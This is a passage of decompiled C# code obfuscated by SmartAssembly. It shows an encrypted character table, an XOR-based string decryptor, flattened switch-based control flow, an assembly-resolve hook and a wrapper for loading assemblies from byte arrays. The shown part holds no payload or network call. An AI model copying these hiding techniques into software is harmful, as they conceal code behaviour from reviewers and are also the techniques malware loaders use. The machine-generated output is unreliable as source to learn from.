              'ᨉ',
              'ஞ',
              'ᇢ',
              '᭑',
              '◗',
              'ኅ',
              '㰘',
              '㉤',
              'ᨪ',
              'ர',
              'ᆂ',
              'ᭀ',
              '◻',
              'ኛ',
              '㱪',
              '\u3227',
              'ᨬ',
              'ல',
              'ᆄ',
              '᭚',
              '◺',
              'ኙ',
              '㰼',
              '㈓',
              'ᨗ',
              '\u0B81',
              'ᆕ',
              '᭩',
              '◗',
              'ኣ',
              '㰣',
              '㈘',
              'ᨄ',
              'ு',
              'ᆹ',
              'ᬤ',
              '\u0011',
              '\u0006',
              char.MinValue,
              'ை',
              'ᆁ',
              'ᭆ',
              '◥',
              'ኴ',
              '㰓',
              '\u0012',
              '$',
              char.MinValue,
              'ᆂ',
              'ᬬ',
              '◸',
              'እ',
              '㰂',
              '㈜',
              'ᨭ',
              '\u0B84',
              'ᇤ',
              '\u1B4C',
              '◘',
              'ዄ',
              '㰳',
              '㈼',
              'ᨓ',
              'ஆ',
              'ᆿ',
              '᭚',
              '◁',
              'ክ',
              '㰩',
              '㈗',
              'ᨖ',
              'ஞ',
              'ᆄ',
              'ᬮ',
              '◈',
              'ኵ',
              '㰍',
              '\u3229',
              'ᨑ',
              'ள',
              'ᆕ',
              '᭵',
              '▻',
              'ዊ',
              '\u0013',
              '\u0006',
              char.MinValue,
              '᭴',
              '◷',
              '\u12B7',
              '㱳',
              '㉱',
              'ᨢ',
              '\u0014',
              ' ',
              char.MinValue,
              '◀',
              'ኘ',
              '㱪',
              '㈘',
              '᨞',
              'ஃ',
              'ᆐ',
              'ᬭ',
              '◣',
              '\u12B6',
              '㰊',
              '㈉',
              'ᨵ',
              '\u0B9D',
              'ᆗ',
              '᭳',
              '◡',
              '\u12B6',
              '㰘',
              '㈂',
              'ᨳ',
              '\u0BA7',
              'ᆊ',
              '᭕',
              '◗',
              'ኮ',
              '㱨',
              '㈘',
              'ᨠ',
              '\u0BA2',
              'ᆹ',
              'ᬤ',
              '\u0015',
              '\u0004',
              char.MinValue,
              'ኆ',
              '㰠',
              '㈒',
              'ᨌ',
              '\u0016',
              '$',
              char.MinValue,
              '㰕',
              '㈿',
              '᩶',
              'ஹ',
              'ᆊ',
              '᭫',
              '◍',
              'ዃ',
              '㰶',
              '㈑',
              'ᨖ',
              'ந',
              'ᆡ',
              'ᬩ',
              '◠',
              'ዃ',
              '㰴',
              '㈒',
              'ᨄ',
              '\u0B96',
              'ᆢ',
              'ᬪ',
              '◹',
              'ኲ',
              '㰌',
              '㈚',
              'ᨁ',
              'ன',
              'ᆶ',
              '\u1B4D',
              '◜',
              '\u12B1',
              '㰝',
              '㈻',
              'ᨍ',
              'ஂ',
              '\u0017',
              '\n',
              char.MinValue,
              '㈕',
              '᩹',
              'அ',
              'ᆡ',
              '᭠',
              '▻',
              'ኍ',
              '㱹',
              '㈵',
              'ᨵ',
              '\u0018',
              '$',
              char.MinValue,
              'ᨉ',
              'ஞ',
              'ᇢ',
              '᭑',
              '◗',
              'ኅ',
              '㰘',
              '㉤',
              'ᨪ',
              'ர',
              'ᆂ',
              'ᭀ',
              '◻',
              '\u12C6',
              '㱪',
              '㈼',
              'ᨰ',
              'ள',
              'ᇣ',
              '᭚',
              '◼',
              '\u12BF',
              '㰂',
              '㈔',
              'ᨥ',
              'ஞ',
              'ᇠ',
              '᭒',
              '◛',
              'ኳ',
              '㰉',
              '㈁',
              'ᨇ',
              '\u0BA0',
              'ᇯ',
              'ᬤ',
              '\u0019',
              '\u001C',
              char.MinValue,
              'ா',
              'ᆽ',
              'ᬩ',
              '◇',
              'ኯ',
              '㰨',
              '㈒',
              'ᩲ',
              '\u0B9D',
              'ᆓ',
              'ᭉ',
              '◖',
              'ኃ',
              '㰶',
              '㉠',
              'ᨯ',
              'ட',
              'ᆀ',
              '᭱',
              '◙',
              'ነ',
              '㰂',
              '㈪',
              'ᨐ',
              '\u0BA7',
              'ᆛ',
              '᭖',
              '◎',
              '\u001A',
              '\b',
              char.MinValue,
              'ᆨ',
              'ᬭ',
              '◦',
              'ነ',
              '㱨',
              '㉡',
              'ᨮ',
              'ு',
              '\u001B',
              '\a',
              char.MinValue,
              'ᬰ',
              '▢',
              'ኌ',
              '㰎',
              '㈌',
              '᩠',
              'ௐ',
              '\u001C',
              '\f',
              char.MinValue,
              '◀',
              'ኾ',
              '㰱',
              '㈞',
              'ᨇ',
              '\u0BBD',
              'ᆜ',
              '᭡',
              '▾',
              '\u12B6',
              '㰗',
              '㉭',
              '\u001D',
              '\t',
              char.MinValue,
              'ዝ',
              '㰉',
              '㉩',
              'ᩯ',
              '\u0B8C',
              'ᆬ',
              'ᭈ',
              '▽',
              'ዖ',
              '\u001E',
              'd',
              char.MinValue,
              '㰟',
              '㈱',
              'ᨥ',
              '\u0BAB',
              'ᆊ',
              '᭒',
              '◷',
              'ኦ',
              '㰢',
              '㈆',
              'ᨧ',
              '\u0B98',
              'ᆦ',
              'ᬨ',
              '◠',
              'ዃ',
              '㰰',
              '㈄',
              '\u1A1C',
              'ழ',
              'ᆢ',
              'ᬪ',
              '◥',
              'ኙ',
              '㰂',
              '㈙',
              'ᨅ',
              'ஷ',
              'ᆄ',
              'ᭋ',
              '◈',
              'ኘ',
              '㰔',
              '㈈',
              'ᨅ',
              'ங',
              'ᆶ',
              '\u1B7D',
              '◝',
              'ኖ',
              '㰰',
              '㉤',
              'ᨈ',
              '\u0BBA',
              'ᆗ',
              '᭸',
              '◨',
              'ዎ',
              '㰍',
              '㈲',
              '᩿',
              'ீ',
              'ᆪ',
              '᭟',
              '◾',
              'ዅ',
              '㰰',
              '㈖',
              'ᨃ',
              '\u0B98',
              'ᆣ',
              '᭚',
              '◁',
              'ክ',
              '㰪',
              '㉢',
              'ᨂ',
              '\u0BA2',
              'ᆇ',
              '᭐',
              '▸',
              'ኲ',
              '㰻',
              '㈒',
              'ᨍ',
              'ஞ',
              'ᆛ',
              'ᭁ',
              '◘',
              'ኮ',
              '㰹',
              '㈳',
              'ᨶ',
              'ஔ',
              'ᆹ',
              '᭓',
              '▾',
              'ኅ',
              '㰗',
              '㈿',
              'ᨭ',
              'ஓ',
              'ᆊ',
              '᭫',
              '◍',
              'ኚ',
              '㱯',
              '\u3227',
              '᩻',
              'ௌ',
              '\u001F',
              '\u0003',
              char.MinValue,
              '㉼',
              'ᨗ',
              'ற',
              ' ',
              '\u0004',
              char.MinValue,
              'ᨃ',
              '\u0BA0',
              'ᇯ',
              'ᬤ',
              '!',
              '\u0003',
              char.MinValue,
              '\u0BAB',
              'ᇲ',
              'ᬩ',
              '"',
              '\u0003',
              char.MinValue,
              'ᇾ',
              'ᭅ',
              '▶'
            };
            chArray = new char[8];
            num1 = 7;
            continue;
          case 6:
            num2 = 6;
            num1 = 2;
            continue;
          case 7:
            num2 = 1;
            num1 = 2;
            continue;
          case 9:
            chArray[7] = '㉐';
            chArray[4] = '▏';
            chArray[3] = 'ᬙ';
            num1 = 6;
            continue;
          case 10:
            chArray[2] = 'ᇒ';
            goto case 1;
          case 12:
            chArray[5] = 'ዷ';
            chArray[6] = '㱚';
            goto case 0;
          case 13:
            num2 = 0;
            num1 = 2;
            continue;
          default:
            num2 = 3;
            num1 = 2;
            continue;
        }
      }
label_24:
      Ⴐ.Ⴅ.Ⴐ = chArray;
    }

    internal static string Ⴜ(int Ⴅ, int Ⴈ)
    {
label_3:
      int num1 = 15;
      int index1;
      string str;
      char[] chArray;
      while (true)
      {
        int num2;
        int index2;
        char[] ⴅ;
        int length1;
        char[] ⴐ;
        int length2;
        int index3;
        int num3;
        int num4;
        switch (num1)
        {
          case 0:
            num1 = index3 < length1 ? 16 : 20;
            continue;
          case 1:
            index3 = 1 + index3;
            num2 = 6;
            num1 = 5;
            continue;
          case 2:
            goto label_43;
          case 3:
            chArray = new char[length1];
            ⴐ = Ⴐ.Ⴅ.Ⴐ;
            length2 = ⴐ.Length;
            index2 += 3;
            num1 = 7;
            continue;
          case 4:
            ⴅ = Ⴐ.Ⴅ.Ⴅ;
            index1 = (int) ⴅ[index2];
            num1 = 6;
            continue;
          case 5:
            int num5;
            switch (num2)
            {
              case 0:
                num5 = 23;
                break;
              case 1:
                num5 = 21;
                break;
              case 2:
                num5 = 11;
                break;
              case 3:
                num5 = 7;
                break;
              case 4:
                num5 = 1;
                break;
              case 5:
                num5 = 11;
                break;
              case 6:
                num5 = 0;
                break;
              case 7:
                num5 = 19;
                break;
              case 8:
                num5 = 15;
                break;
              case 9:
                num5 = 17;
                break;
              case 10:
                num5 = 3;
                break;
              case 11:
                num5 = 15;
                break;
              case 12:
                num5 = 10;
                break;
              case 13:
                num5 = 2;
                break;
              default:
                num5 = 19;
                break;
            }
            num1 = num5;
            continue;
          case 6:
            num2 = 0;
            num1 = 5;
            continue;
          case 7:
            num2 = 12;
            num1 = 5;
            continue;
          case 8:
            num2 = 10;
            num1 = 5;
            continue;
          case 9:
            goto label_3;
          case 10:
            index3 = 0;
            num2 = 6;
            goto case 22;
          case 11:
            int num6 = (int) ⴅ[index2 + 1];
            length1 = ((int) ⴅ[index2 + 2] << 16) + num6;
            num1 = 8;
            continue;
          case 12:
            goto label_44;
          case 13:
            num3 = 9;
            break;
          case 14:
            num3 = 2;
            break;
          case 15:
            index2 = Ⴅ ^ 1528405422 ^ Ⴈ;
            goto case 4;
          case 16:
            num4 = 1;
            goto label_41;
          case 17:
            goto label_29;
          case 18:
            num2 = 4;
            num1 = 5;
            continue;
          case 19:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.Ⴜ);
            num2 = 8;
            num1 = 5;
            continue;
          case 20:
            num4 = 13;
            goto label_41;
          case 21:
            chArray[index3] = (char) ((uint) ⴅ[index2 + index3] ^ (uint) ⴐ[(index3 + index1) % length2]);
            num1 = 18;
            continue;
          case 22:
            num1 = 5;
            continue;
          case 23:
            num1 = (str = Ⴐ.Ⴅ.Ⴃ[index1]) == null ? 14 : 13;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.Ⴜ);
            num1 = 9;
            continue;
        }
        num2 = num3;
        num1 = 5;
        continue;
label_41:
        num2 = num4;
        num1 = 5;
      }
label_29:
      return str;
label_43:
      str = new string(chArray);
      Ⴐ.Ⴅ.Ⴃ[index1] = str;
label_44:
      return str;
    }

    internal static char Ⴗ(string Ⴍ, int Ⴐ, int Ⴅ, int Ⴓ)
    {
label_3:
      int num1 = 0;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            int num4;
            switch (Ⴓ ^ Ⴅ)
            {
              case 94:
                num4 = 12;
                break;
              default:
                num4 = 4;
                break;
            }
            num1 = num4;
            continue;
          case 2:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.Ⴗ);
            num2 = 0;
            num1 = 8;
            continue;
          case 3:
            goto label_3;
          case 4:
            num3 = 1;
            break;
          case 5:
          case 8:
            int num5;
            switch (num2)
            {
              case 0:
                num5 = 0;
                break;
              case 1:
                num5 = 9;
                break;
              case 2:
                num5 = 10;
                break;
              case 3:
                num5 = 0;
                break;
              case 4:
                num5 = 2;
                break;
              case 5:
                num5 = 7;
                break;
              case 6:
                num5 = 0;
                break;
              case 7:
                num5 = 7;
                break;
              default:
                num5 = 2;
                break;
            }
            num1 = num5;
            continue;
          case 7:
            goto label_24;
          case 9:
          case 11:
            num2 = 0;
            num1 = 8;
            continue;
          case 10:
            num2 = 0;
            num1 = 8;
            continue;
          case 12:
            num3 = 5;
            break;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.Ⴗ);
            num1 = 3;
            continue;
        }
        num2 = num3;
        num1 = 8;
      }
label_24:
      return SmartAssembly.Attributes.Ⴓ.Ⴍ(Ⴍ, Ⴐ, 575, 628);
    }

    internal static DateTime ႣႨ(int Ⴅ, int Ⴐ)
    {
label_3:
      int num1 = 6;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            num2 = 6;
            goto case 9;
          case 1:
            goto label_3;
          case 2:
          case 10:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.ႣႨ);
            goto case 3;
          case 3:
            num2 = 6;
            num1 = 12;
            continue;
          case 5:
            num2 = 6;
            num1 = 12;
            continue;
          case 6:
            int num4;
            switch (Ⴐ ^ Ⴅ)
            {
              case 108:
                num4 = 7;
                break;
              default:
                num4 = 8;
                break;
            }
            num1 = num4;
            continue;
          case 7:
            num3 = 4;
            break;
          case 8:
            num3 = 1;
            break;
          case 9:
            num1 = 12;
            continue;
          case 11:
            goto label_26;
          case 12:
            int num5;
            switch (num2)
            {
              case 0:
                num5 = 2;
                break;
              case 1:
                num5 = 0;
                break;
              case 2:
                num5 = 5;
                break;
              case 3:
                num5 = 0;
                break;
              case 4:
                num5 = 11;
                break;
              case 5:
                num5 = 11;
                break;
              case 6:
                num5 = 6;
                break;
              case 7:
                num5 = 6;
                break;
              default:
                num5 = 2;
                break;
            }
            num1 = num5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.ႣႨ);
            num1 = 1;
            continue;
        }
        num2 = num3;
        num1 = 12;
      }
label_26:
      return \u0002.Ⴐ.Ⴜ(173, 167);
    }

    internal static char Ⴜ(int Ⴓ, int Ⴈ, int Ⴀ)
    {
label_3:
      int num1 = 12;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
          case 3:
            num2 = 7;
            num1 = 8;
            continue;
          case 1:
            num3 = 3;
            break;
          case 2:
            goto label_24;
          case 4:
            num2 = 7;
            num1 = 8;
            continue;
          case 5:
            num3 = 5;
            break;
          case 7:
          case 9:
          case 12:
            int num4;
            switch (Ⴀ ^ Ⴈ)
            {
              case 17:
                num4 = 1;
                break;
              default:
                num4 = 5;
                break;
            }
            num1 = num4;
            continue;
          case 8:
            int num5;
            switch (num2)
            {
              case 0:
                num5 = 3;
                break;
              case 1:
                num5 = 11;
                break;
              case 2:
                num5 = 12;
                break;
              case 3:
                num5 = 2;
                break;
              case 4:
                num5 = 12;
                break;
              case 5:
                num5 = 4;
                break;
              case 6:
                num5 = 3;
                break;
              case 7:
                num5 = 12;
                break;
              default:
                num5 = 11;
                break;
            }
            num1 = num5;
            continue;
          case 10:
            goto label_3;
          case 11:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.Ⴜ);
            num2 = 7;
            num1 = 8;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.Ⴜ);
            num1 = 10;
            continue;
        }
        num2 = num3;
        num1 = 8;
      }
label_24:
      return SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴓ(Ⴓ, 302, 325);
    }

    internal static void Ⴓ(Thread Ⴀ, ApartmentState Ⴐ, int Ⴅ, int Ⴃ)
    {
      int num1 = 2;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            goto label_22;
          case 1:
            num3 = 1;
            break;
          case 3:
            num2 = 3;
            goto case 4;
          case 4:
            num1 = 10;
            continue;
          case 5:
          case 8:
            num3 = 4;
            break;
          case 6:
            int num4;
            switch (Ⴃ ^ Ⴅ)
            {
              case (int) sbyte.MaxValue:
                num4 = 1;
                break;
              default:
                num4 = 8;
                break;
            }
            num1 = num4;
            continue;
          case 7:
            goto label_21;
          case 9:
            goto label_23;
          case 10:
            int num5;
            switch (num2)
            {
              case 0:
                num5 = 7;
                break;
              case 1:
                num5 = 7;
                break;
              case 2:
                num5 = 7;
                break;
              case 3:
                num5 = 6;
                break;
              case 4:
                num5 = 3;
                break;
              case 5:
                num5 = 9;
                break;
              default:
                num5 = 6;
                break;
            }
            num1 = num5;
            continue;
          default:
            num2 = 3;
            num1 = 10;
            continue;
        }
        num2 = num3;
        num1 = 10;
      }
label_22:
      return;
label_23:
      return;
label_21:
      \u0002.Ⴐ.Ⴄ.Ⴅ(Ⴀ, Ⴐ, 393, 446);
    }

    internal static object ႨႭ(object Ⴍ, int Ⴗ, int Ⴅ)
    {
label_3:
      int num1 = 5;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            int num4;
            switch (num2)
            {
              case 0:
                num4 = 1;
                break;
              case 1:
                num4 = 1;
                break;
              case 2:
                num4 = 8;
                break;
              case 3:
                num4 = 5;
                break;
              case 4:
                num4 = 1;
                break;
              case 5:
                num4 = 6;
                break;
              case 6:
                num4 = 3;
                break;
              case 7:
                num4 = 1;
                break;
              default:
                num4 = 8;
                break;
            }
            num1 = num4;
            continue;
          case 1:
            goto label_25;
          case 2:
            num1 = 0;
            continue;
          case 3:
          case 12:
            num2 = 3;
            num1 = 0;
            continue;
          case 4:
          case 11:
            num3 = 5;
            break;
          case 5:
            int num5;
            switch (Ⴅ ^ Ⴗ)
            {
              case 62:
                num5 = 7;
                break;
              default:
                num5 = 11;
                break;
            }
            num1 = num5;
            continue;
          case 6:
            num2 = 3;
            num1 = 0;
            continue;
          case 7:
            num3 = 4;
            break;
          case 8:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.ႨႭ);
            num2 = 3;
            goto case 2;
          case 10:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.ႨႭ);
            num1 = 10;
            continue;
        }
        num2 = num3;
        num1 = 0;
      }
label_25:
      return SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴄ(Ⴍ, 544, 632);
    }

    internal static byte ႨႨ(ref Color Ⴀ, int Ⴅ, int Ⴐ)
    {
label_3:
      int num1 = 13;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.ႨႨ);
            num2 = 6;
            num1 = 5;
            continue;
          case 1:
          case 6:
            goto label_3;
          case 2:
            num3 = 3;
            break;
          case 3:
            num2 = 6;
            num1 = 5;
            continue;
          case 4:
            goto label_28;
          case 5:
            int num4;
            switch (num2)
            {
              case 0:
                num4 = 0;
                break;
              case 1:
                num4 = 3;
                break;
              case 2:
                num4 = 9;
                break;
              case 3:
                num4 = 8;
                break;
              case 4:
                num4 = 0;
                break;
              case 5:
                num4 = 4;
                break;
              case 6:
                num4 = 13;
                break;
              case 7:
                num4 = 8;
                break;
              case 8:
                num4 = 4;
                break;
              default:
                num4 = 0;
                break;
            }
            num1 = num4;
            continue;
          case 7:
            num3 = 8;
            break;
          case 8:
            goto label_27;
          case 9:
            num2 = 6;
            num1 = 5;
            continue;
          case 10:
            num3 = 1;
            break;
          case 13:
            int num5;
            switch (Ⴐ ^ Ⴅ)
            {
              case 13:
                num5 = 2;
                break;
              case 14:
                num5 = 7;
                break;
              default:
                num5 = 10;
                break;
            }
            num1 = num5;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.ႨႨ);
            num1 = 1;
            continue;
        }
        num2 = num3;
        num1 = 5;
      }
label_27:
      return SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴈ(ref Ⴀ, 475, 432);
label_28:
      return SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴈ(ref Ⴀ, 657, 765);
    }

    internal static MethodInfo ႨႰ(Assembly Ⴅ, int Ⴀ, int Ⴐ)
    {
label_3:
      int num1 = 12;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            num3 = 6;
            break;
          case 1:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.ႨႰ);
            num2 = 0;
            num1 = 2;
            continue;
          case 2:
            int num4;
            switch (num2)
            {
              case 0:
                num4 = 12;
                break;
              case 1:
                num4 = 12;
                break;
              case 2:
                num4 = 6;
                break;
              case 3:
                num4 = 1;
                break;
              case 4:
                num4 = 1;
                break;
              case 5:
                num4 = 3;
                break;
              case 6:
                num4 = 10;
                break;
              case 7:
                num4 = 3;
                break;
              default:
                num4 = 1;
                break;
            }
            num1 = num4;
            continue;
          case 3:
            goto label_25;
          case 4:
          case 12:
            int num5;
            switch (Ⴐ ^ Ⴀ)
            {
              case 35:
                num5 = 5;
                break;
              default:
                num5 = 0;
                break;
            }
            num1 = num5;
            continue;
          case 5:
          case 11:
            num3 = 5;
            break;
          case 6:
            num2 = 0;
            num1 = 2;
            continue;
          case 7:
            num1 = 2;
            continue;
          case 8:
            goto label_3;
          case 10:
            num2 = 0;
            goto case 7;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.ႨႰ);
            num1 = 8;
            continue;
        }
        num2 = num3;
        num1 = 2;
      }
label_25:
      return SmartAssembly.Attributes.Ⴓ.ႥႠ(Ⴅ, 326, 273);
    }

    internal static object Ⴗ(MethodBase Ⴗ, object Ⴐ, object[] Ⴃ, int Ⴀ, int Ⴅ)
    {
label_3:
      int num1 = 7;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
          case 1:
          case 5:
            int num4;
            switch (num2)
            {
              case 0:
                num4 = 7;
                break;
              case 1:
                num4 = 12;
                break;
              case 2:
                num4 = 3;
                break;
              case 3:
                num4 = 12;
                break;
              case 4:
                num4 = 4;
                break;
              case 5:
                num4 = 11;
                break;
              case 6:
                num4 = 7;
                break;
              case 7:
                num4 = 3;
                break;
              default:
                num4 = 4;
                break;
            }
            num1 = num4;
            continue;
          case 2:
            num3 = 5;
            break;
          case 3:
          case 8:
            num2 = 6;
            num1 = 5;
            continue;
          case 4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Ⴐ.Ⴅ.Ⴗ);
            num2 = 6;
            num1 = 5;
            continue;
          case 6:
            num3 = 3;
            break;
          case 7:
            int num5;
            switch ((Ⴅ ^ Ⴀ) - 0)
            {
              case 0:
                num5 = 6;
                break;
              default:
                num5 = 2;
                break;
            }
            num1 = num5;
            continue;
          case 9:
            goto label_3;
          case 11:
            num2 = 6;
            num1 = 5;
            continue;
          case 12:
            goto label_24;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Ⴐ.Ⴅ.Ⴗ);
            num1 = 9;
            continue;
        }
        num2 = num3;
        num1 = 5;
      }
label_24:
      return SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴐ(Ⴗ, Ⴐ, Ⴃ, 408, 456);
    }

    internal static void Ⴓ()
    {
      int num1 = 5;
      int num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            int num3;
            switch (num2)
            {
              case 0:
                num3 = 6;
                break;
              case 1:
                num3 = 2;
                break;
              case 2:
                num3 = 2;
                break;
              case 3:
                num3 = 2;
                break;
              case 4:
                num3 = 6;
                break;
              default:
                num3 = 2;
                break;
            }
            num1 = num3;
            continue;
          case 1:
          case 3:
          case 6:
            goto label_15;
          case 2:
            if (!Ⴐ.Ⴅ.Ⴅ)
            {
              num1 = 4;
              continue;
            }
            goto label_35;
          case 4:
            num2 = 0;
            goto case 7;
          case 7:
            num1 = 0;
            continue;
          default:
            num2 = 3;
            num1 = 0;
            continue;
        }
      }
label_35:
      return;
label_15:
      Type type;
      SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴀ((object) (type = typeof (Ⴐ.Ⴅ)), 187, 199);
      try
      {
        int num4 = 1;
        while (true)
        {
          int num5;
          int num6;
          switch (num4)
          {
            case 0:
              int num7;
              switch (num5)
              {
                case 0:
                  num7 = 12;
                  break;
                case 1:
                  num7 = 4;
                  break;
                case 2:
                  num7 = 3;
                  break;
                case 3:
                  num7 = 8;
                  break;
                case 4:
                  num7 = 12;
                  break;
                case 5:
                  num7 = 12;
                  break;
                default:
                  num7 = 12;
                  break;
              }
              num4 = num7;
              continue;
            case 2:
              num6 = 2;
              break;
            case 3:
            case 5:
              goto label_39;
            case 4:
              Ⴐ.Ⴅ.Ⴅ = true;
              num4 = 8;
              continue;
            case 7:
            case 8:
              \u0002.Ⴐ.ႷႭ(\u0002.Ⴐ.Ⴄ.Ⴀ(690, 711), new ResolveEventHandler(\u0001.Ⴈ), 64, 39);
              num4 = 10;
              continue;
            case 9:
            case 10:
              num5 = 2;
              num4 = 0;
              continue;
            case 11:
              num6 = 1;
              break;
            case 12:
              num4 = Ⴐ.Ⴅ.Ⴅ ? 2 : 11;
              continue;
            default:
              num5 = 4;
              num4 = 0;
              continue;
          }
          num5 = num6;
          num4 = 0;
        }
      }
      finally
      {
        switch (3)
        {
          case 4:
          default:
            SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴀ.Ⴀ((object) type, 4, 121);
            goto case 4;
        }
      }
label_39:
      int num8 = 8;
      int num9;
      while (true)
      {
        switch (num8)
        {
          case 0:
            num9 = 5;
            num8 = 5;
            continue;
          case 2:
          case 3:
          case 4:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ);
            num9 = 5;
            num8 = 5;
            continue;
          case 5:
            int num10;
            switch (num9)
            {
              case 0:
                num10 = 0;
                break;
              case 1:
                num10 = 3;
                break;
              case 2:
                num10 = 0;
                break;
              case 3:
                num10 = 0;
                break;
              case 4:
                num10 = 0;
                break;
              case 5:
                num10 = 6;
                break;
              default:
                num10 = 0;
                break;
            }
            num8 = num10;
            continue;
          case 6:
            goto label_53;
          default:
            num9 = 4;
            num8 = 5;
            continue;
        }
      }
label_53:;
    }

    internal static object Ⴜ(AppDomain Ⴄ, string Ⴅ, int Ⴐ, int Ⴍ)
    {
label_3:
      int num1;
      switch (Ⴍ ^ Ⴐ)
      {
        case 115:
          num1 = 5;
          break;
        default:
          num1 = 0;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 7:
            num2 = 2;
            continue;
          case 1:
            num2 = 2;
            continue;
          case 2:
            goto label_3;
          case 4:
          case 5:
            goto label_8;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴜ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴈ(Ⴄ, Ⴅ, 251, 241);
    }

    internal static Assembly Ⴓ(byte[] Ⴀ, byte[] Ⴗ, Evidence Ⴃ, int Ⴓ, int Ⴅ)
    {
label_3:
      int num1;
      switch (Ⴅ ^ Ⴓ)
      {
        case 81:
          num1 = 1;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 4:
          case 6:
          case 7:
            goto label_8;
          case 2:
            num2 = 5;
            continue;
          case 3:
            num2 = 5;
            continue;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ);
            num2 = 5;
            continue;
        }
      }
label_8:
      return SmartAssembly.Attributes.Ⴓ.Ⴃ.Ⴗ(Ⴀ, Ⴗ, Ⴃ, 580, 537);
    }

    [StructLayout(LayoutKind.Explicit, Size = 1398, Pack = 1)]
    private struct ႰႰ
    {
    }
  }
}
